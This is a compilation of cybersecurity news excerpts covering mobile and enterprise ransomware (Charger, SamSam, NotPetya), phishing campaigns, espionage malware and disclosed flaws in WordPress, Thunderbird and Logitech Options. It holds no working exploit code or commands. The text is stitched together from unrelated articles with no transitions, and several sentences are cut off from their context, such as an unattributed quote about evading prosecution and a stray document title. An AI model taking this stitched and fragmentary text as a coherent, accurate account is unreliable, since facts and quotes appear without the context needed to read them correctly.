The first ransomware attack on a phone occurred in 2013, according to the Check Point researchers, but until now has been confined to small numbers of victims, primarily in Eastern Europe.
Now, the company says, the threat has gained a toehold in the United States.
Koriat and Polkovnichenko found the software, which they dubbed Charger, embedded in an app called Energy Rescue, which purports to make a phone battery last longer.
""The infected app steals contacts and SMS messages from the user’s device and asks for admin permissions,"" the company said in a statement.
""If granted, the ransomware locks the device and displays a message demanding payment.""
The payment demanded was 0.2 bitcoin, or about $180 at the current exchange rate.
(The phone was being used for business and didn't contain much personal data; the owner chose to replace the phone rather than pay.)
The most disturbing part of the attack might be that the app was downloaded from the Google Play store.
Android phones can use apps from other sources, but security experts usually recommend that users stick to the Play store to take advantage of the processes Google uses to check the software for safety.
""The main issue here is the fact that such a severe threat managed to penetrate Google's security and enter Google Play, Google's official app store,"" says Daniel Padon, another member of Check Point's research team.
""Most malware that manages to enter Google Play has only slim malicious traits, while Charger is about as malicious as can be.
As mobile ransomware try to keep the pace with their cousins in the PC world, we are likely to see more efforts of this sort, endangering users around the world.""
Padon added that this malware was particularly sophisticated, using a number of innovative tactics to evade detection by Google.
Google commended the security firm for catching the Charger threat so early.
""We appreciate Check Point’s efforts to raise awareness about this issue,"" a Google spokesperson says.
""We’ve taken the appropriate actions in Play and will continue to work closely with the research community to help keep Android users safe.""
Ransomware attacks on mobile phones are still relatively rare.
One well-known case involved users of pornography apps in Eastern Europe who were targeted by ransomware called DataLust, Check Point says.
In those cases, the ransom was set at 1,000 rubles, or about $15.
There's evidence that Charger, too, comes from Eastern Europe—beyond the clichéd bad grammar of the ransom note.
""This is likely done to keep the developers from being prosecuted in their own countries or being extradited between countries.""
Ransomware attacks are joining a growing list of threats to mobile phone security.

(TNS) — Last month, employees at the Colorado Department of Transportation were greeted by a message on their computer screens similar to this:
“All your files are encrypted with RSA-2048 encryption. … It’s not possible to recover your files without private key. … You must send us 0.7 BitCoin for each affected PC or 3 BitCoins to receive ALL Private Keys for ALL affected PC’s.”
CDOT isn’t paying, but others have. In fact, so-called ransomware has become one of the most lucrative criminal enterprises in the U.S. and internationally, with the FBI estimating total payments are nearing $1 billion. Hackers use ransomware to encrypt computer files, making them unreadable without a secret key, and then demand digital currency like bitcoin if victims want the files back — and many victims are falling for that promise.
Ransomware infects more than 100,000 computers around the world every day and payments are approaching $1 billion, said U.S. Deputy Attorney General Rod J. Rosenstein during the October 2017 Cambridge Cyber Summit, citing FBI statistics. A study by researchers at Google, Chainalysis, University of California San Diego and NYU Tandon School of Engineering estimated that from 2016 to mid 2017, victims paid $25 million in ransom to get files back.
And one out of five businesses that do pay the ransom don’t get their data back, according to 2016 report by Kaspersky Labs.
Last spring, the Erie County Medical Center in New York was attacked by SamSam due to a misconfigured web server, according to The Buffalo News. Because it had backed up its files, the hospital decided not to pay the estimated $44,000 ransom. It took six weeks to get back to normal at a recovery cost of nearly $10 million.
More recently in January, the new SamSam variant sneaked into Indiana hospital Hancock Health, which decided to pay 4 bitcoin, or about $55,000, in ransom. Attackers gained entry by using a vendor’s username and password on a Thursday night. The hospital was back online by Monday morning.
Colorado security officials are still investigating the CDOT ransomware attack that took 2,000 employee computers offline for more than a week. They don’t plan to pay the ransom but offered few details about the attack other than confirming it was a variant of the SamSam ransomware. Security researchers with Cisco’s Talos, which shared the SamSam message with The Denver Post, reported in January that the new SamSam variant had so far collected 30.4 bitcoin, or about $325,217.
The reality is that people need to be smarter about computer security. That means patching software, using anti-malware software, and not sharing passwords and accounts. And not opening files, emails or links from unfamiliar sources — and sometimes familiar sources.
Webroot doesn’t have an official stance on whether to pay a ransom to get files back, but Dufour says it’s a personal decision. Cybersecurity companies like Webroot can advise whether the hacker has a reputation for restoring files after payment is received.
“Paying a ransom to a cybercriminal is an incredibly personal decision. It’s easy to say not to negotiate with criminals when it’s not your family photos or business data that you’ll never see again. Unfortunately, if you want your data back, paying the ransom is often the only option,” Dufour said. “However, it’s important to know that there are some strains of ransomware that have coding and encryption errors. For these cases, even paying the ransom won’t decrypt your data. I recommend checking with a computer security expert before paying any ransom.”

HACKERS connected with last week’s devastating NotPetya cyber attack have offered help — but it comes at a price.
HACKERS connected with the ransomware that devastated overseas banks, power stations, and even Cadbury factories in Australia last week have issued a new ransom demand — and it’s for much more money than before.
The new ransom note was published in two places on the Dark Web and demanded a payment of 100 Bitcoins, or about $340,000, in return for a private security key that could decrypt any file locked by the Petya/Goldeneye malware.
The hackers even opened a chat room and offered to decrypt one file for potential buyers as proof that the key would work, though it’s not clear whether this was a bluff.
The demand was a significant increase on the ransomware’s initial request for just less than $400 in Bitcoin when the malware was launched in the Ukraine last Tuesday before rapidly spreading through computer networks worldwide.
Bitcoin transactions show its creators were able to access more than $13,000 paid by victims, however, even though their email address was suspended by its German provider.
It’s not known whether victims who paid the ransom received a security key to unlock their files.
The dangerous ransomware affected as many as 16,000 computers in 64 countries, according to security firm Clavister, and crippled the operations of several European companies.
Some Australian businesses were also affected through their international connections, including Cadbury factories in Tasmania and Victoria, TNT Express courier services, and the offices of law firm DLA Piper.
The demand or money came amid growing speculation that the ransomware was not designed to make a profit, but was a form of digital terrorism or industrial espionage.
ESET senior research fellow Nick FitzGerald said the Petya malware was designed to kill computers first, and ask for money second.
“(Being ransomware) was a mechanism to help hide the trail of a gang of cyber terrorists or spies,” he said.
Mr FitzGerald advised victims not to pay any ransom as there was very little chance they would be able to unlock their files.

Hacker group “Charming Kitten” used false identities to ferret out information, says Israel-based cybersecurity firm ClearSky 
An Iranian cyber espionage group known as Charming Kitten is believed to be behind a campaign targeting academic researchers, human rights activists, media outlets and political advisors focusing on Iran, according to a report published earlier this week by Israel-based threat intelligence company ClearSky Cyber Security. The group has also set up a news outlet called The British News Agency to lure targets in. 
Most of the group's targets are in Iran, the U.S., Israel and the U.K., the report said, but some come from countries including France, Germany, Switzerland, Denmark, India, Turkey and the United Arab Emirates. 
The report detailed the various methods used to gain access to computers and private social accounts. Those include false identities, the impersonation of real companies, the insertion of malicious code into a breached website, also known as ""watering hole attacks,"" and spear phishing, the process of pretending to be service providers like Gmail or Facebook to trick people into giving out personal information.
A significant mainstay of the group's activity was the establishment of a media outlet called The British News Agency. Much effort went into creating a seemingly legitimate website, including details about the agency and a contact list of the management team. The purpose of the site was to attract the targets and infect them with malware.
According to the report, multiple Israeli researchers of Iran and the Middle East were sent emails and Twitter direct messages from accounts registered with seemingly Jewish Israeli names. Messages coming from one such account were presented as if coming from a journalist and political researcher at KNBC News. Other messages were presented as if coming from an Israeli political researcher raised in California who needed help with an article and also wanted to apply for a position at an Israeli university. Another message was described as coming from a Jewish girl living in Iran. These messages often linked to phishing pages.
ClearSky cannot estimate how many accounts were successfully infiltrated, but the success rate for such attacks is usually around 10%, said Mr. Dolev.

 The spread of ransomware means government and critical infrastructure providers need to start gaming out responses, cyber watchers say.
A cadre of shadowy criminal hackers seizes control of an energy plant. They give themselves administrator privileges and lock the genuine administrators out along with everyone else. Then, they threaten to trigger a major leak or explosion if the plant owners don’t pay up: $50 million in bitcoin.
The story sounds like a fantastical Hollywood plot. It’s basically a digital-age riff on the 1965 James Bond Film “Thunderball” and the 1997 spoof “Austin Powers: International Man of Mystery.”
Yet, following a surge in ransomware attacks—in which hackers seize and lock an organization’s data and networks and only unlock them for a hefty fee—cyber watchers are beginning to fear this plot could become reality.
“What ransomware does is it creates a business model [in which] anybody who has money can potentially be extorted to pay,” McAfee Chief Technology Officer Steve Grobman told reporters during a roundtable discussion Thursday at McAfee’s Security Through Innovation Summit.
“There’s no reason not to think that criminals will see government assets like critical infrastructure as a target they can hold for ransom,” Grobman added.
If hackers were able to seize the controls of a critical infrastructure asset such as a dam or airport where they could cause major property destruction and loss of life, the ransom demand could be huge, Grobman said, and there’s a good chance the asset owner or the government would have to pay up.
Critical infrastructure is an official designation the Homeland Security Department uses to refer to 16 sectors such as chemical plants and financial firms whose physical and digital security is vital for national security and public safety.  
McAfee has been tracking ransomware attacks for years as they progressed from extorting $100 or $200 from individuals who clicked the wrong link to “soft targets” such as hospitals, universities and police stations to some of the major global corporations the antivirus firm counts among its customers.
There’s no reason to think government agencies or critical infrastructure providers won’t be next on the list, he said.
John Felker, director of the DHS’ main cybersecurity nerve center, the National Cybersecurity and Communications Integration Center, shares Grobman’s concerns.
“What Steve is seeing is on the front edge of what is going on, [so] we do need to have some concern. I’m probably going to have a chat with the folks at the fort about that,” he said during the same roundtable, referring to the National Security Agency’s home in Fort Meade, Maryland.
While ransomware attacks against local governments are a common problem across the globe, NCCIC has not been called in on a ransomware attack against the federal government that threatened major destruction, Felker said.
When it comes to critical infrastructure, the major cyber fear has typically been an attack by an adversary nation or terrorist group looking to cause destruction and mayhem. For traditional criminal hackers interested in stealing marketable information such as credit card numbers, these targets held little interest.
Industrial systems such as dams are further protected because they operate using comparatively obscure industrial control systems not typically in the wheelhouse of hackers used to manipulating consumer software.
For ransomware attackers, however, industrial targets could prove lucrative because a hacker that controlled them would have the power to unleash terrible consequences if the ransom wasn’t paid, Grobman said, such as opening that New York dam’s floodgates.
Criminals also operate with a different calculus than nation-states, which makes them more difficult to deter, Grobman said.
The Justice Department has indicted hackers linked to the Chinese and Iranian governments, which caused public embarrassment. The Obama administration also sanctioned North Korean officials for the Sony Pictures Entertainment hack and Russian officials for meddling in the 2016 election.
Then-President Barack Obama and Vice President Joe Biden also insinuated the government took covert actions against Russia for that meddling.
A criminal or criminal group that didn’t expect to be caught, however, would be less susceptible to public embarrassment, immune to diplomatic pressure and much more difficult to target with covert action.
The remedy, Grobman said, is for the government and critical infrastructure providers to plan ahead, both by securing their systems and gaming out how they would respond to a ransomware attack.
“How do we get the defenses in place before the breach occurs,” he said, “so we don’t have the consequences that we saw in things like [the Office of Personnel Management breach] where, because we didn’t invest in the security up front, the cost of the breach was significantly higher.”

It’s still the first week of 2017, and we’ve already had a WhatsApp scam warning from a keen Naked Security reader.
This one tries to draw you in by claiming you’ll get free Wi-Fi service, promising to keep you connected even if you don’t have 3G airtime or a Wi-Fi connection of your own.
It sounds too good to be true, and that’s because it is!
Here’s what the message looks like:
The suffix .ML visible in the link above stands for Mali, which started giving away domain names for free a few years ago.
(It’s not the only country to do this, but it claims to have been the first African nation to do so.)
The use of a free domain isn’t always a reliable indicator of a scam, not least because even mainstream-looking .COM domains can be had for a dollar these days, but you don’t need the link to make you suspicious in this case.
There’s a lot that’s visually wrong with this message, such as the inconsistent spellings Whatsapp and whatsapp, both of which are incorrect; the poor spacing and punctuation; and the rather casually confused way that Wifi (which is, in fact, properly written Wi-Fi) and 3G are mixed into the story.
Nevertheless, scams propagated on social media services ofter pass the “why not try it?” test, because they generally come from people you know and communicate with regularly.
Spelling mistakes, shortened URLs, casual language and other inconsistencies might very well seem suspicious in an email claiming to be an official message from a well-known brand…
…but not in what looks like a quick message from a friend.
You can probably imagine what happens if you click through: you enter the murky world of bait-and-switch.
That’s where you are drawn in with the promise of something that sounds both useful and interesting, but quickly find that there are a few hoops to jump through first.
As with many scams of this sort, where you end up and what you have to do to “qualify” may differ from what we saw and are reporting here.
That’s because cloud-based scams of this sort, where the content isn’t delivered in the original message but via a series of web URLs, can vary their form over time.
Crooks can tailor the content they serve up in just the same way that legitimate sites do, based on many factors such as: where you are; what browser you are using; what time of day it is; what operating system or device you have; which ISP you’ve used to connect; whether you’ve visited before; and much more.
We encountered two rather different bait-and-switch campaigns – we’re guessing that the crooks were using the device type to choose how to hit us up.
When we used an (old) iPhone, we quickly ended up with a chance to win a brand new iPhone for free:
When we clicked through, we found out how this scam is spread.
Instead of using malware to push out messages furtively behind your back, the crooks use you as their propagation vector by telling you send the message to eight other recipients on WhatsApp:
When we used an (old) Android device, the crooks were even pushier, insisting that we forward the scam to fifteen new recipients first:
Cheekily, the buttons marked [About], [FAQ] and [Blog] take you to genuine WhatsApp pages, thus adding a veneer of legitimacy.
We didn’t invite anyone, of course, but a little bit of digging revealed the page that we’d have ended up on if we’d done what the crooks wanted:
Amusingly, if cyberscamming can ever be considered funny, the [App2] button downloaded an Android Package (APK) file, while the [App3] link took us to a free app on Apple’s App Store.
No devices exist that can run Android and iOS apps side-by-side – it’s one or the other, or neither, but never both – so we couldn’t have complied with the demands of the crooks even if we’d wanted to.
The crooks had rigged up the buttons to redirect through various affiliate programmes, which are online marketing services where you get paid some sort of referral fee for generating clicks to, or downloads from, someone else’s site.
In fact, this page refuses to let you use the [FINISH] button at first, popping up a message to warn you very ungrammatically that You have not installed All Apps in your mobile.
For what it’s worth, the Android app was what seems to be the official front-end to an alternative Android app store aimed at the Indian market; the iOS software was a shopping app for a popular Chinese web service.
When it comes to freebies, special deals and other innocent-sounding web offers, especially when they are apparently recommended by your friends, it’s easy to fall into the “no harm in taking a look” trap.
After all, this scam doesn’t actually try to trigger any exploits to implant malware on your phone, or trick you into installing malware, so it’s easy to think of it as mostly harmless.
But it’s a scam nevertheless, and even if all you do is to take a look, you’re taking part in something with potentially harmful side-effects on the community around you, from bombarding your friends with unwanted messages to helping crooks to earn affiliate revenues fraudulently.

Columbia Sportswear Co, is investigating an attack on one of its e-commerce sites.
CEO Tim Boyle told analysts on Columbia’s fourth quarter 2016 earnings call that there was an unspecified cyber attack on its prAna brand’s online store.
Columbia Sportswear acquired prAna in May 2014 for $190 million in cash.
“We immediately launched an investigation and engaged a leading third-party cyber security firm to assist us,” he told analysts on the call, according to a transcript from Seeking Alpha.
“Protecting our customers’ information is one of our top priorities and we are taking this very seriously.
Until the investigation is completed, it’s difficult to characterize the scope or nature of the potential incident, but we are working vigilantly to address this issue”.
Boyle stressed that the attack was limited to prAna’s site and did not affect Columbia’s other online stores.
Online sales are growing fast for the outdoor apparel maker and retailer.
Boyle told analysts the company generated about $220 million in online sales globally in 2016.

We’ve witnessed ransomware targeting Windows and Linux systems and Macs, Android devices, smart TVs, and even a ransomware scheme targeting iPhone users (though not effected through malware).
Initial targets of ransomware-wielding criminals were mostly individual users.
Not long after, the crooks discovered that they could get greater sums from businesses and organizations whose critical data and systems they managed to encrypt and/or make unusable.
So they began hitting hospitals and other healthcare institutions, universities and schools, police departments and transportation systems, and businesses of every kind.
Such a lucrative business model is not going to be abandoned soon, and we are sure to witness its evolution.
A group of researchers from Georgia Tech School of Electrical and Computer Engineering showed that it’s possible to craft ransomware aimed at compromising and fiddling with industrial control systems.
The team demonstrated their own proof-of-concept ransomware targeting programmable logic controllers (PLCs) at RSA Conference 2017 on Monday, showing how a hacker might disrupt the regular functioning of a water treatment plant.
They started their research into this attack possibility by identifying severs common PLCs in use at industrial facilities, then obtained three different devices for testing.
They probed them for security issues such as weak authentication mechanisms and susceptibility to settings changes, and finally combined them with pumps, tubes and tanks to create a simulated water treatment facility.
But “recent attacks on hospitals have demonstrated how profitable ransomware can be when used to hold operationally critical assets hostage with the threat of human harm, and reports suggest attackers are beginning to shift their focus on ICS networks”.
I would imagine that the ransom demanded in these cases could be higher than anything seen so far, as the damages to the physical systems could be extensive and the potential for human harm is great.
On the other hand, the risk for the attackers is also higher, as government agencies would surely get involved in tracking them down.

A Ukrainian cybercrime operation has made an estimated $50 million by using Google AdWords to lure users on Bitcoin phishing sites.
The operation has been temporarily disrupted this month when Ukrainian cyber police shut down servers hosting some of the phishing sites, acting on information they received from Cisco's Talos security division.
No arrests were made, and it's very likely that the group will make a comeback in the future.

The group —which Cisco tracked internally under the codename of Coinhoarder— has been operating for years, but appears to have used the same scheme since February 2017, possibly earlier.
Crooks purchase so-called typosquatted domains that imitate the real Blockchain.info Bitcoin wallet management service. Coinhoarder operators then set up phishing pages on these domains that log users credentials, which they later use to steal funds from users' accounts.
According to Cisco, instead of using malvertising or spam campaigns, crooks buy legitimate ads via the Google AdWords platform and place links to their phishing sites at the top of Bitcoin-related Google search results.
This trick is not only simple to execute but very effective. Cisco reported that based on DNS query data, ads for one domain roped in over 200,000 users. It is believed the group lured tens of millions of users to its phishing sites.
It is unclear how many users tried to log in on the fake sites, but after tracking down various thefts reported on social media and involving some of the Coinhoarder groups typosquatted domains, Cisco says the group made around $50 million worth of Bitcoin in the past three years.
For example, in one campaign that took place from September 2017 to December 2017, the group made around $10 million, while in another campaign that lasted 3.5 weeks, the group made another $2 million.

Researchers also point out that crooks used geo-targeting filters for their ads, targeting mostly Bitcoin owners in Africa.
""This threat actor appears to be standing up phishing pages to target potential victims African countries and other developing nations where banking can be more difficult, and local currencies much more unstable compared to the digital asset,"" researchers said in a report published yesterday. ""Additionally, attackers have taken notice that targeting users in countries whose first language is not English make for potentially easier targets.""
Cisco says it tracked down the phishing sites hosted on the servers of a bulletproof hosting provider located in Ukraine —Highload Systems. This is where Ukraine's cyber police department intervened and took down servers.
According to Cisco, the Coinhoarder group is by far the largest phishing operation that has targeted Blockchain.info, the biggest Bitcoin wallet service online.
Bleeping Computer, too, has spotted increases in phishing campaigns targeting Blockchain.info in December 2016 and December 2017.
Among the new tricks detected by Cisco since our previous reports, crooks have started using Let's Encrypt certificates to make their phishing sites load via HTTPS, and have also incorporated homograph attacks.

Two Italian siblings have been arrested on Monday and stand accused of having spied on Italian politicians, state institutions and law enforcement agencies, businesses and businesspeople, law firms, leaders of Italian masonic lodges, and Vatican officials for years.
45-year-old Giulio Occhionero and 49-year-old Francesca Maria Occhionero, both from Rome but currently residing in London, have allegedly used specially crafted malware (dubbed “EyePyramid”) to compromise the targets’ computers and exfiltrate all kinds of documents, as well as log keystrokes and steal login credentials for sensitive accounts.
According to court documents (in Italian), the investigation began a few months after a security professional employed by ENAV, an Italian company responsible for the provision of air traffic services (ATS) and other air navigation services in Italy, flagged and reported a malicious attachment he received via email.
The spear-phishing email was purportedly sent by an Italian attorney, but the infosec pro became suspicious and sent the attachment to security company Mentat Solutions for analysis.
The attachment was found to contain the EyePyramid malware.
After the authorities got involved, the investigation revealed that the email was, indeed, sent from the attorney’s email account, but that it was sent by someone who had compromised the account and accessed it via TOR.

Google has stopped Wednesday’s clever email phishing scheme, but the attack may very well make a comeback.
One security researcher has already managed to replicate it, even as Google is trying to protect users from such attacks.
“It looks exactly like the original spoof,” said Matt Austin, director of security research at Contrast Security.
The phishing scheme -- which may have circulated to 1 million Gmail users -- is particularly effective because it fooled users with a dummy app that looked like Google Docs.
Recipients who received the email were invited to click a blue box that said “Open in Docs.” Those who did were brought to an actual Google account page that asks them to handover Gmail access to the dummy app.
While fooling users with spoofed emails is nothing new, Wednesday’s attack involved an actual third-party app made with real Google processes. The company’s developer platform can enable anyone to create web-based apps.
In this case, the culprit chose to name the app “Google Docs” in an effort to trick users.
The search company has shut down the attack by removing the app. It’s also barred other developers from using “Google” in naming their third-party apps.
More traditional phishing email schemes can strike by tricking users into giving up their login credentials. However, Wednesday’s attack takes a different approach and abuses what’s known as the OAuth protocol, a convenient way for internet accounts to link with third-party applications.
Through OAuth, users don’t have to hand over any password information. They instead grant permission so that one third-party app can connect to their internet account, at say, Google, Facebook or Twitter.
But like any technology, OAuth can be exploited. Back in 2011, one developer even warned that the protocol could be used in a phishing attack with apps that impersonate Google services.
Nevertheless, OAuth has become a popular standard used across IT. CloudLock has found that over 276,000 apps use the protocol through services like Google, Facebook and Microsoft Office 365.
For instance, the dummy Google Docs app was registered to a developer at eugene.pupov@gmail.com -- a red flag that the product wasn’t real.
However, the dummy app still managed to fool users because Google’s own account permission page never plainly listed the developer’s information, unless the user clicks the page to find out, Parecki said.
“I was surprised Google didn’t show much identifying information with these apps,” he said. “It’s a great example of what can go wrong.”
Rather than hide those details, all of it should be shown to users, Parecki said.  
Austin agreed, and said apps that ask for permission to Gmail should include a more blatant warning over what the user is handing over.
“I’m not on the OAuth hate bandwagon yet. I do see it as valuable,” Austin said. “But there are some risks with it.”
Fortunately, Google was able to quickly foil Wednesday’s attack, and is introducing “anti-abuse systems” to prevent it from happening again. Users who might have been affected can do a Google security checkup to review what apps are connected to their accounts.
The company’s Gmail Android app is also introducing a new security feature to warn users about possible phishing attempts.  
It's tempting to install apps and assume they're safe. But users and businesses need to be careful when linking accounts to third-party apps, which might be asking for more access than they need, Cloudlock's Kaya said. 
""Hackers have a headstart exploiting this attack,"" she said. ""All companies need to be thinking about this.""

A severe WordPress vulnerability which has been left a year without being patched has the potential to disrupt countless websites running the CMS, researchers claim.
At the BSides technical cybersecurity conference in Manchester on Thursday, Secarma researcher Sam Thomas said the bug permits attackers to exploit the WordPress PHP framework, resulting in a full system compromise.
If the domain permits the upload of files, such as image formats, attackers can upload a crafted thumbnail file in order to trigger a file operation through the ""phar://"" stream wrapper.
In turn, the exploit triggers eXternal Entity (XXE -- XML) and Server Side Request Forgery (SSRF) flaws which cause unserialization in the platform's code. While these flaws may only originally result in information disclosure and may be low risk, they can act as a pathway to a more serious remote code execution attack.
The security researcher says the core vulnerability, which is yet to receive a CVE number, is within the wp_get_attachment_thumb_file function in /wpincludes/post.php and when attackers gain control of a parameter used in the ""file_exists"" call,"" the bug can be triggered.
Unserialization occurs when serialized variables are converted back into PHP values. When autoloading is in place, this can result in code being loaded and executed, an avenue attackers may exploit in order to compromise PHP-based frameworks.
""Unserialization of attacker-controlled data is a known critical vulnerability, potentially resulting in the execution of malicious code,"" the company says.
The issue of unserialization was first uncovered back in 2009, and since then, vulnerabilities have been recognized in which the integrity of PHP systems can be compromised, such as CVE-2017-12934, CVE-2017-12933, and CVE-2017- 12932.
The WordPress content management system (CMS) is used by millions of webmasters to manage domains, which means the vulnerability potentially has a vast victim pool should the flaw being exploited in the wild.
""I've highlighted that the unserialization is exposed to a lot of vulnerabilities that might have previously been considered quite low-risk,"" Thomas explainde. ""Issues which they might have thought were fixed with a configuration change or had been considered quite minor previously might need to be reevaluated in the light of the attacks I demonstrated.""
According to Secarma, the CMS provider was made aware of the security issue in February 2017, but ""is yet to take action.""
TechRepublic: The need for speed: Why you should optimize your CMS
Technical details have been provided in a white paper (.PDF).
""This research continues a worrying recent trend, in demonstrating that object (un)serialization is an integral part of several modern languages,"" Thomas said. ""We must constantly be aware of the security impact of such mechanisms being exposed to attackers.""
No reports have been received which suggest the exploit is being actively used in the wild.
The vulnerability was originally reported through the WordPress HackerOne bug bounty program last year. The issue was confirmed after several days and Thomas was credited for his findings.
However, a Secarma spokesperson told ZDNet that while there was ""some attempt to fix the issue"" in May 2017, this did not address the problem.
""Communication then went dead for a number of months and has only recently begun again,"" the spokesperson added.
ZDNet has reached out to WordPress and will update if we hear back.

Thunderbird has pushed code with fixes for a dozen security vulnerabilities – including the EFAIL encryption mess that emerged in May.
The EFAIL-specific fixes address two errors in Thunderbird's handling of encrypted messages: CVE-2018-12372, in which an attacker can build S/MIME and PGP decryption oracles in HTML messages; and CVE-2018-12373, in which S/MIME plaintext can be leaked if a message is forwarded.
EFAIL was announced with a much-criticised process. The discoverers emphasised the issue's exploitability to read messages encrypted with PGP and S/MIME – but the vulnerabilities were specific to client implementations.
Thunderbird users will therefore welcome news that the client has joined the list of EFAIL-safe email tools.
Thunderbird 52.9 also includes some critical-rated fixes. CVE-2018-12359 was a buffer overflow leading to a potentially exploitable crash: “A buffer overflow can occur when rendering canvas content while adjusting the height and width of the <canvas> element dynamically, causing data to be written outside of the currently computed boundaries.”
The other, CVE-2018-12360, is a use-after-free, also with a potentially exploitable crash: “A use-after-free vulnerability can occur when deleting an input element during a mutation event handler triggered by focusing that element.”
Security researcher Matt Nelson noticed that under Windows 10, users weren't getting warned when they were opening executable SettingContent-ms files (CVE-2018-12368).
That bug meant “unsuspecting users unfamiliar with this new file type might run an unwanted executable. This also allows a WebExtension with the limited downloads.open permission to execute arbitrary code without user interaction on Windows 10 systems”.
Thunderbird also inherited some memory safety bugs from the Firefox code base.
The program's developers noted that many of the bugs aren't directly exploitable in the e-mail client (scripting is disabled when you're reading messages), but “are potentially risks in browser or browser-like contexts”.

Logitech Options is an app that controls all of Logitech’s mice and keyboards. It offers several different configurations like Changing function key shortcuts, Customizing mouse buttons, Adjusting point and scroll behavior and etc. This app contained a huge security flaw that was discovered by Tavis Ormandy who is a Google security researcher. It was found that Logitech Options was opening a WebSocket server on each individual computer Logitech Options was run on. This WebSocket server would open on port 10134 on which any website could connect and send several various commands which would be JSON-encoded.
PID Exploit
Through this any attacker can get in and run commands just by setting up a web page. The attacker only needs the Process Identifier (PID). However the PID can be guessed as the software has no limit on the amount of try’s conducted.
Once the attacker has obtained the PID and is in, consequently he can then completely control the Computer and run it remotely. This can also be used for keystroke injection or Rubber Ducky attacks which have been used to take over PC’s in the past.
After Ormandy got a hold of Logitech’s engineers, he reported the vulnerability privately to them in a meeting between the Logitech’s engineering team and Ormandy on the 18th of September. After waiting a total of 90 days, Ormandy saw the company’s failure in addressing the issue publicly or through a patch for the app, Thus Ormandy himself posted his finding on the 11th of December making the issue public.
As the story gained attention Accordingly Logitech responded with an update for Logitech Options. Logitech released Options version 7.00.564 on the 13th of December. They claim to have fixed the origin and type checking bugs along with a patch for the security vulnerability. However they have not mentioned the Security Vulnerability patch on their own website. They told German magazine heise.de that the new version does indeed fix the vulnerability
Travis Ormandy and his team are currently checking the new version of Logitech Options for any signs of Security Vulnerabilities. Everyone with the old version of Logitech Options are advised to upgrade to the new 7.00.564.

A report released on Monday by The Centre for Internet and Society reveals that over 135 million records from India's Aadhaar national ID systems have already leaked online.
The leaks didn't take place because of a flaw in the national Aadhaar system, but through government agencies that handle Aadhar data. According to the report, just four government programs are responsible for leaking a whopping number of 135 million records.
The programs mentioned in the report are India's National Social Assistance Programme (NSAP), the National Rural Employment Guarantee Scheme (NREGA), the Govt. of Andhra Pradesh's Chandranna Bima Scheme, and the Govt. of Andhra Pradesh's Daily Online Payment Reports of NREGA.
The prevalence of Aadhaar data is how The Centre for Internet and Society has discovered the leak.
Improperly configured systems exposed the details of program participants on the Internet. While the full Aadhaar database was never exposed, details in the government program databases allow a fraudster to tie a person's leaked details (names, addresses, phone numbers) to an Aadhaar 12-digit ID.
If enough of these details leak in different places, fraudster can build comprehensive profiles on Indian citizens, even recreating the Aadhaar database themselves.
For its part, the Indian government has admitted that some of the Aadhaar database has leaked online through its ministries, said it started investigations, and is already preparing changes to Aadhaa'rs security policies.

Right now, because of the massive leak of 135 million details, including Aadhaar IDs, Indians stand to become victims of financial fraud. In the future, as other government programs leak more data, including biometrics, the problem will pass the point where the government could do anything to fix it.

After the publication of an article in Security Affairs called ""ClearEnergy ransomware aim to destroy process automation logics in critical infrastructure, SCADA and industrial control systems,"" security researchers used Twitter to bash the company for what they felt were lies about real world attacks, the company orchestrating a media stunt, and not releasing any research they could vet.
Following this criticism, the company ended up apologizing, saying they forgot to mention it was only a proof-of-concept ransomware, and promised to release more details in the upcoming days.
According to a blog post published a day later, CRITIFENCE experts only revealed they discovered two issues in the Modicon Modbus protocol used in PLC (Programmable Logic Controllers), equipment that is often found in industrial facilities all over the world, and used to control and automate sensors and motors.
In their blog post, CRITIFENCE experts claimed to have developed a proof-of-concept ransomware that can use the two issues (CVE-2017-6032 and CVE-2017-6034) to delete a PLC's ladder logic diagram, if a ransom isn't paid in due time, effectively wiping the PLC's software.
At the time of writing, CRITIFENCE has not published the technical report they promised.
Nevertheless, the two security flaws CRITIFENCE discovered are real and have resulted in a patch from Schneider Electric, the PLC vendor whose products are affected.
Earlier this year, researchers from the Georgia Institute of Technology (GIT) have created a proof-of-concept ransomware strain named LogicLocker that can alter programmable logic controller (PLC) parameters.

Malicious Microsoft Word documents that abuse macros have long been the bane of Windows users.
Now, security researchers have found what may be the first such real-world attack to infect Macs.
Allies and Rivals Digest Trump's Victory - Carnegie Endowment for International Peace.""
It was taken almost verbatim from EmPyre, an open-source exploit framework for Macs.
By the time the researchers found the booby-trapped document, the securitychecking.org was no longer serving the payload, so it wasn't possible to know precisely what it did.
But the Empyre component the macro borrowed allowed for persistent infections that contained a wide range of capabilities, including monitoring webcams, stealing passwords and encryption keys stored in the keychain, and accessing browsing histories.
The overall quality of the malware wasn't particularly advanced.
As unsophisticated as they seem, malicious macros remain vexingly effective at infecting large numbers of people who should know better.
Word macros, for instance, were the initial infection point to the first known hacker-caused power outage, which left 225,000 Ukrainians without electricity in December 2015.
Malicious macros also power some of the most aggressive strains of ransomware, including one known as Locky.
Macros seemed to make a comeback in late 2014 with the rise of the Dridex malware, presumably as improved security in Java, Adobe Flash, and Internet Explorer made it harder to exploit those applications.
""By using macros in Word documents, they are exploiting the weakest link; humans!""
Patrick Wardle, who is director of research at security firm Synack, wrote in an analysis of the malicious document.
""And moreover since macros are 'legitimate' functionality (vs. say a memory corruption vulnerability) the malware's infection vector doesn't have to worry about crashing the system nor being 'patched' out.""
Wardle's analysis on Monday came the same day that two unrelated researchers reported finding a separate piece of Mac malware in the wild that was designed to steal credentials from the keychain.
Like the malicious Word document, the malware was poorly written and lifted other developers' code.
Taken together, however, the discoveries suggest that mainstream MacOS malware has yet to catch up to its Windows counterparts, but that the gap is steadily closing.

A security researcher that only goes by the nickname of Racco42 discovered the vulnerability on Thursday, January 12.
The issue affected only one Cerber server, not all, and was most likely due to a misconfiguration.
The server wasn't a command and control server, but a mere staging server from where the victims' computers would connect and download the actual ransomware, which would later run and infect their PCs.
An error in one of the server files (hxxp://truthforeyoue.top/search.php) displayed page source code, instead of executing it.
This information found its way to Avast security researcher Jaromir Horejsi, who together with the Avast team leveraged this error to get control over the server.
For a period of three hours, the Avast teams explains, they collected information from server logs.
The Avast team observed over 700 users download Cerber installers, which ran on their PCs.
Extrapolating this number to a whole day, just one typical Cerber ransomware staging server would be able to deliver payloads to around 8,400 users during a spam run peak or malvertising campaigns.

Microsoft Windows users beware of an unpatched memory corruption bug which could be exploited to cause denial of service (DoS) attacks as well as other exploits.
